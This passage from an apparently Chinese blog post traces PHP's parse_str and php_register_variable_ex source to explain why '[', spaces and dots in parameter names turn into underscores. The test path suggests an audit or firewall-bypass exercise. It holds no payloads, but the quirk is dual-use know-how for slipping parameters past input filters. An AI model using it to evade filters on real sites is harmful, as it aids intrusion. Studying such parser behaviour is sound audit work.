class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    parse_str(<span class="hljs-string">&#x27;test[abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br>    parse_str(<span class="hljs-string">&#x27;test abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br>    parse_str(<span class="hljs-string">&#x27;test.abc=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br><span class="hljs-comment">//我们一定期望 tmp 的键名 分别是 test[abc,test abc,test.abc 然而预期的现象并没有发生</span><br><span class="hljs-comment">//返回结果</span><br><br>E:\审计专用\easyFirewall-shell\审计\test.php:<span class="hljs-number">3</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>E:\审计专用\easyFirewall-shell\审计\test.php:<span class="hljs-number">5</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>E:\审计专用\easyFirewall-shell\审计\test.php:<span class="hljs-number">7</span>:<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-string">&#x27;test_abc&#x27;</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们发现 ‘[‘ ,’ ‘和’.’，都被替换为了’_’，接下来让我们从内核的角度看一下为什么会出现这样的问题。</p><p>构建简单的PHP代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$tmp</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    parse_str(<span class="hljs-string">&#x27;test[ab=1&#x27;</span>,<span class="hljs-variable">$tmp</span>);<br>    var_dump(<span class="hljs-variable">$tmp</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>关于 parse_str 函数的定义是在 <code>$PHP_SRC/ext/standard/string.c line 5033</code> 处</p><p>让我们来简单看一下函数定义的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">PHP_FUNCTION(parse_str)<br>&#123;<br><span class="hljs-keyword">char</span> *arg;<br>zval *arrayArg = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span> *res = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">size_t</span> arglen;<br><br>ZEND_PARSE_PARAMETERS_START(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">//Zend虚拟机只负责脚本语义解析，所以这里不用过分关注</span><br>Z_PARAM_STRING(arg, arglen)<br><span class="hljs-function">Z_PARAM_OPTIONAL</span><br><span class="hljs-function"><span class="hljs-title">Z_PARAM_ZVAL</span><span class="hljs-params">(arrayArg)</span></span><br><span class="hljs-function"><span class="hljs-title">ZEND_PARSE_PARAMETERS_END</span><span class="hljs-params">()</span></span>;<br><br>res = estrndup(arg, arglen);   <span class="hljs-comment">//将字符串拷贝到新建的位置处</span><br><br><span class="hljs-keyword">if</span> (arrayArg == <span class="hljs-literal">NULL</span>) &#123;<br>zval tmp;<br>zend_array *symbol_table;<br><span class="hljs-keyword">if</span> (zend_forbid_dynamic_call(<span class="hljs-string">&quot;parse_str() with a single argument&quot;</span>) == FAILURE) &#123;  <span class="hljs-comment">//错误处理</span><br>efree(res);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>php_error_docref(<span class="hljs-literal">NULL</span>, E_DEPRECATED, <span class="hljs-string">&quot;Calling parse_str() without the result argument is deprecated&quot;</span>);<br><br>symbol_table = zend_rebuild_symbol_table();<br>ZVAL_ARR(&amp;tmp, symbol_table);<br>sapi_module.treat_data(PARSE_STRING, res, &amp;tmp);     <span class="hljs-comment">//负责线程不安全的处理方法，我这里是TS版本所以实际这里不必关注</span><br><span class="hljs-keyword">if</span> (UNEXPECTED(zend_hash_del(symbol_table, ZSTR_KNOWN(ZEND_STR_THIS)) == SUCCESS)) &#123;<br>zend_throw_error(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Cannot re-assign $this&quot;</span>);<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>arrayArg = zend_try_array_init(arrayArg);<br><span class="hljs-keyword">if</span> (!arrayArg) &#123;<br>efree(res);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>sapi_module.treat_data(PARSE_STRING, res, arrayArg);  <span class="hljs-comment">//这里真正开始解析变量也就是在这个地方下断点</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进来到  <code>$PHP_SRC/main/php_variables.c</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111036660.png" alt="image-20220111103617451"></p><p>这里给出源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">SAPI_API <span class="hljs-title">SAPI_TREAT_DATA_FUNC</span><span class="hljs-params">(php_default_treat_data)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> *res = <span class="hljs-literal">NULL</span>, *var, *val, *separator = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *c_var;<br>zval <span class="hljs-built_in">array</span>;<br><span class="hljs-keyword">int</span> free_buffer = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> *strtok_buf = <span class="hljs-literal">NULL</span>;<br>zend_long count = <span class="hljs-number">0</span>;<br><br>ZVAL_UNDEF(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_POST:<br><span class="hljs-keyword">case</span> PARSE_GET:<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>array_init(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_POST:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_POST]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_POST], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_GET:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_GET]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_GET], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_COOKIE]);<br>ZVAL_COPY_VALUE(&amp;PG(http_globals)[TRACK_VARS_COOKIE], &amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>ZVAL_COPY_VALUE(&amp;<span class="hljs-built_in">array</span>, destArray);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_POST) &#123;    <span class="hljs-comment">//根据变量的不同类型运行不同解析方法</span><br>sapi_handle_post(&amp;<span class="hljs-built_in">array</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_GET) &#123;<span class="hljs-comment">/* GET data */</span><br>c_var = SG(request_info).query_string;<br><span class="hljs-keyword">if</span> (c_var &amp;&amp; *c_var) &#123;<br>res = (<span class="hljs-keyword">char</span> *) estrdup(c_var);<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>free_buffer = <span class="hljs-number">0</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<span class="hljs-comment">/* Cookie data */</span><br>c_var = SG(request_info).cookie_data;<br><span class="hljs-keyword">if</span> (c_var &amp;&amp; *c_var) &#123;<br>res = (<span class="hljs-keyword">char</span> *) estrdup(c_var);<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>free_buffer = <span class="hljs-number">0</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg == PARSE_STRING) &#123;<span class="hljs-comment">/* String data */</span>  <span class="hljs-comment">//解析字符串 这个才是我们关注的，但是这里没有函数调用接着往下看</span><br>res = str;<br>free_buffer = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!res) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">switch</span> (arg) &#123;<br><span class="hljs-keyword">case</span> PARSE_GET:<br><span class="hljs-keyword">case</span> PARSE_STRING:<br>separator = PG(arg_separator).input;  <span class="hljs-comment">//PG是为了解决线程安全的全局变量宏</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> PARSE_COOKIE:<br>separator = <span class="hljs-string">&quot;;\0&quot;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>var = php_strtok_r(res, separator, &amp;strtok_buf);  <span class="hljs-comment">//字符串切片存入数组，因为这里&amp;strtok_buf是NULL所以这里只是遍历没有影响</span><br><br><span class="hljs-keyword">while</span> (var) &#123;<br><span class="hljs-keyword">size_t</span> val_len;<br><span class="hljs-keyword">size_t</span> new_val_len;<br><br>val = <span class="hljs-built_in">strchr</span>(var, <span class="hljs-string">&#x27;=&#x27;</span>);   <span class="hljs-comment">//=用于区分变量名，变量名对应的变量值 这里val取到了变量的值</span><br><br><span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<br><span class="hljs-comment">/* Remove leading spaces from cookie names, needed for multi-cookie header where ; can be followed by a space */</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">isspace</span>(*var)) &#123;<br>var++;<br>&#125;<br><span class="hljs-keyword">if</span> (var == val || *var == <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br><span class="hljs-keyword">goto</span> next_cookie;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (++count &gt; PG(max_input_vars)) &#123;<br>php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Input variables exceeded &quot;</span> ZEND_LONG_FMT <span class="hljs-string">&quot;. To increase the limit change max_input_vars in php.ini.&quot;</span>, PG(max_input_vars));      <span class="hljs-comment">//越界检测</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (val) &#123; <span class="hljs-comment">/* have a value */</span>   <span class="hljs-comment">//就是在尾巴加上结束符</span><br><br>*val++ = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (arg == PARSE_COOKIE) &#123;<br>val_len = php_raw_url_decode(val, <span class="hljs-built_in">strlen</span>(val));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>val_len = php_url_decode(val, <span class="hljs-built_in">strlen</span>(val));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>val     = <span class="hljs-string">&quot;&quot;</span>;<br>val_len =  <span class="hljs-number">0</span>;<br>&#125;<br><br>val = estrndup(val, val_len);<br><span class="hljs-keyword">if</span> (arg != PARSE_COOKIE) &#123;<br>php_url_decode(var, <span class="hljs-built_in">strlen</span>(var));<br>&#125;<br><span class="hljs-keyword">if</span> (sapi_module.input_filter(arg, var, &amp;val, val_len, &amp;new_val_len)) &#123;<br>php_register_variable_safe(var, val, new_val_len, &amp;<span class="hljs-built_in">array</span>);   <span class="hljs-comment">//这里开始真正注册变量了 标重点！！！！！！！！！！！！下面放图</span><br>&#125;<br>efree(val);<br>next_cookie:<br>var = php_strtok_r(<span class="hljs-literal">NULL</span>, separator, &amp;strtok_buf);<br>&#125;<br><br><span class="hljs-keyword">if</span> (free_buffer) &#123;<br>efree(res);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到最终会运行 php_register_variable_ex  上面的 ZVAL_NEW_STR 是注册字符串操作</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111055574.png" alt="image-20220111105528468"></p><p>终于来到了真正产生问题的地方，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">PHPAPI <span class="hljs-keyword">void</span> <span class="hljs-title">php_register_variable_ex</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *var_name, zval *val, zval *track_vars_array)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> *p = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span> *ip = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">/* index pointer */</span><br><span class="hljs-keyword">char</span> *index;<br><span class="hljs-keyword">char</span> *var, *var_orig;<br><span class="hljs-keyword">size_t</span> var_len, index_len;<br>zval gpc_element, *gpc_element_p;<br>zend_bool is_array = <span class="hljs-number">0</span>;<br>HashTable *symtable1 = <span class="hljs-literal">NULL</span>;<br>ALLOCA_FLAG(use_heap)<br><br>assert(var_name != <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">if</span> (track_vars_array &amp;&amp; Z_TYPE_P(track_vars_array) == IS_ARRAY) &#123;<br>symtable1 = Z_ARRVAL_P(track_vars_array);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!symtable1) &#123;<br><span class="hljs-comment">/* Nothing to do */</span><br>zval_ptr_dtor_nogc(val);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-comment">/* ignore leading spaces in the variable name */</span><br><span class="hljs-keyword">while</span> (*var_name==<span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>var_name++;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Prepare variable name</span><br><span class="hljs-comment"> */</span><br>var_len = <span class="hljs-built_in">strlen</span>(var_name);<br>var = var_orig = do_alloca(var_len + <span class="hljs-number">1</span>, use_heap); <span class="hljs-comment">//传值</span><br><span class="hljs-built_in">memcpy</span>(var_orig, var_name, var_len + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">/* ensure that we don&#x27;t have spaces or dots in the variable name (not binary safe) */</span><br><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//空格 和 点 会被替换成下划线 </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//如果变量的数组存在 [ 会被认为是array型的变量</span><br>is_array = <span class="hljs-number">1</span>;<br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>var_len = p - var;<br><br><span class="hljs-keyword">if</span> (var_len==<span class="hljs-number">0</span>) &#123; <span class="hljs-comment">/* empty variable name, or variable name with a space in it */</span><br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (var_len == <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;this&quot;</span>)<span class="hljs-number">-1</span> &amp;&amp; EG(current_execute_data)) &#123;<br>zend_execute_data *ex = EG(current_execute_data);<br><br><span class="hljs-keyword">while</span> (ex) &#123;<br><span class="hljs-keyword">if</span> (ex-&gt;func &amp;&amp; ZEND_USER_CODE(ex-&gt;func-&gt;common.type)) &#123;<br><span class="hljs-keyword">if</span> ((ZEND_CALL_INFO(ex) &amp; ZEND_CALL_HAS_SYMBOL_TABLE)<br>&amp;&amp; ex-&gt;symbol_table == symtable1) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(var, <span class="hljs-string">&quot;this&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;this&quot;</span>)<span class="hljs-number">-1</span>) == <span class="hljs-number">0</span>) &#123;<br>zend_throw_error(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Cannot re-assign $this&quot;</span>);<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ex = ex-&gt;prev_execute_data;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* GLOBALS hijack attempt, reject parameter */</span><br><span class="hljs-keyword">if</span> (symtable1 == &amp;EG(symbol_table) &amp;&amp;<br>var_len == <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;GLOBALS&quot;</span>)<span class="hljs-number">-1</span> &amp;&amp;<br>!<span class="hljs-built_in">memcmp</span>(var, <span class="hljs-string">&quot;GLOBALS&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;GLOBALS&quot;</span>)<span class="hljs-number">-1</span>)) &#123;<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>index = var;<br>index_len = var_len;<br><br><span class="hljs-keyword">if</span> (is_array) &#123;<br><span class="hljs-keyword">int</span> nest_level = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">char</span> *index_s;<br><span class="hljs-keyword">size_t</span> new_idx_len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span>(++nest_level &gt; PG(max_input_nesting_level)) &#123;<br>HashTable *ht;<br><span class="hljs-comment">/* too many levels of nesting */</span><br><br><span class="hljs-keyword">if</span> (track_vars_array) &#123;<br>ht = Z_ARRVAL_P(track_vars_array);<br>zend_symtable_str_del(ht, var, var_len);<br>&#125;<br><br>zval_ptr_dtor_nogc(val);<br><br><span class="hljs-comment">/* do not output the error message to the screen,</span><br><span class="hljs-comment"> this helps us to to avoid &quot;information disclosure&quot; */</span><br><span class="hljs-keyword">if</span> (!PG(display_errors)) &#123;<br>php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Input variable nesting level exceeded &quot;</span> ZEND_LONG_FMT <span class="hljs-string">&quot;. To increase the limit change max_input_nesting_level in php.ini.&quot;</span>, PG(max_input_nesting_level));<br>&#125;<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>ip++;<br>index_s = ip;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isspace</span>(*ip)) &#123;<br>ip++;<br>&#125;<br><span class="hljs-keyword">if</span> (*ip==<span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>index_s = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ip = <span class="hljs-built_in">strchr</span>(ip, <span class="hljs-string">&#x27;]&#x27;</span>);<br><span class="hljs-keyword">if</span> (!ip) &#123;<br><span class="hljs-comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span><br>*(index_s - <span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;_&#x27;</span>;       <span class="hljs-comment">//这里就是&#x27;[&#x27;被替换成&#x27;_&#x27;的原因了 在处理数组的逻辑中如果找不到对应的 &#x27;[&#x27;就 替换为 &#x27;_&#x27;</span><br><br>index_len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (index) &#123;<br>index_len = <span class="hljs-built_in">strlen</span>(index);<br>&#125;<br><span class="hljs-keyword">goto</span> plain_var;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>*ip = <span class="hljs-number">0</span>;<br>new_idx_len = <span class="hljs-built_in">strlen</span>(index_s);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!index) &#123;<br>array_init(&amp;gpc_element);<br><span class="hljs-keyword">if</span> ((gpc_element_p = zend_hash_next_index_insert(symtable1, &amp;gpc_element)) == <span class="hljs-literal">NULL</span>) &#123;<br>zend_array_destroy(Z_ARR(gpc_element));<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>gpc_element_p = zend_symtable_str_find(symtable1, index, index_len);<br><span class="hljs-keyword">if</span> (!gpc_element_p) &#123;<br>zval tmp;<br>array_init(&amp;tmp);<br>gpc_element_p = zend_symtable_str_update_ind(symtable1, index, index_len, &amp;tmp);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> 